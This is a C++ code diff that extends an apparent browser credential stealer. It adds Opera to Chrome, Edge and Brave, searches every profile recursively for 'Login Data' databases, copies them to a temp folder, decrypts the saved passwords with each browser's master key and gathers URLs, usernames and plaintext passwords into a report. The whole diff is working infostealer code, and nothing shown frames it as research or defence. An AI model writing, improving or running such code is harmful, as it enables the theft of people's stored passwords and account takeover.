@@ -93,7 +93,8 @@ namespace credential {
             std::vector<BrowserPath> browsers = {
                 {"Chrome", localAppData + "\\Google\\Chrome\\User Data"},
                 {"Edge", localAppData + "\\Microsoft\\Edge\\User Data"},
-                {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"}
+                {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"},
+                {"Opera", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera Stable"}
             };
 
             for (const auto& browser : browsers) {
@@ -103,48 +104,52 @@ namespace credential {
                 std::vector<BYTE> key = GetMasterKey(localState);
                 if (key.empty()) continue;
 
-                // Check Default and Profile *
-                std::vector<std::string> profiles = {"Default"};
-                for (const auto& entry : fs::directory_iterator(browser.userDataPath)) {
-                    if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) {
-                        profiles.push_back(entry.path().filename().string());
-                    }
-                }
+                // Recursively find "Login Data" to catch all profiles
+                try {
+                    for (const auto& entry : fs::recursive_directory_iterator(browser.userDataPath)) {
+                        if (entry.path().filename() == "Login Data") {
+                            std::string loginData = entry.path().string();
+                            
+                            // Copy to temp to avoid locks
+                            char tempPath[MAX_PATH];
+                            GetTempPathA(MAX_PATH, tempPath);
+                            std::string tempDb = std::string(tempPath) + "temp_login_db_" + browser.name + "_" + std::to_string(GetTickCount());
+                            CopyFileA(loginData.c_str(), tempDb.c_str(), FALSE);
 
-                for (const auto& profile : profiles) {
-                    std::string loginData = browser.userDataPath + "\\" + profile + "\\Login Data";
-                    if (!fs::exists(loginData)) continue;
+                            sqlite3* db;
+                            if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
+                                const char* query = "SELECT origin_url, username_value, password_value FROM logins";
+                                sqlite3_stmt* stmt;
+                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
+                                        const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
+                                        if (!url_ptr || !user_ptr) continue;
 
-                    // Copy to temp to avoid locks
-                    char tempPath[MAX_PATH];
-                    GetTempPathA(MAX_PATH, tempPath);
-                    std::string tempDb = std::string(tempPath) + "temp_login_db_" + browser.name;
-                    CopyFileA(loginData.c_str(), tempDb.c_str(), FALSE);
+                                        std::string url = url_ptr;
+                                        std::string username = user_ptr;
+                                        const void* blob = sqlite3_column_blob(stmt, 2);
+                                        int blobLen = sqlite3_column_bytes(stmt, 2);
+                                        
+                                        if (blobLen > 0) {
+                                            std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
+                                            std::string password = DecryptPassword(encryptedPass, key);
 
-                    sqlite3* db;
-                    if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
-                        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
-                        sqlite3_stmt* stmt;
-                        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
-                            while (sqlite3_step(stmt) == SQLITE_ROW) {
-                                std::string url = (const char*)sqlite3_column_text(stmt, 0);
-                                std::string username = (const char*)sqlite3_column_text(stmt, 1);
-                                const void* blob = sqlite3_column_blob(stmt, 2);
-                                int blobLen = sqlite3_column_bytes(stmt, 2);
-                                
-                                std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
-                                std::string password = DecryptPassword(encryptedPass, key);
-
-                                if (!password.empty() && !username.empty()) {
-                                    report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
+                                            if (!password.empty() && !username.empty()) {
+                                                report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
+                                            }
+                                        }
+                                    }
+                                    sqlite3_finalize(stmt);
                                 }
+                                sqlite3_close(db);
                             }
-                            sqlite3_finalize(stmt);
+                            DeleteFileA(tempDb.c_str());
                         }
-                        sqlite3_close(db);
+                        // Limit depth to avoid scanning everything
+                        if (entry.depth() > 3) entry.disable_recursion_pending();
                     }
-                    DeleteFileA(tempDb.c_str());
-                }
+                } catch (...) {}
             }
         }
 
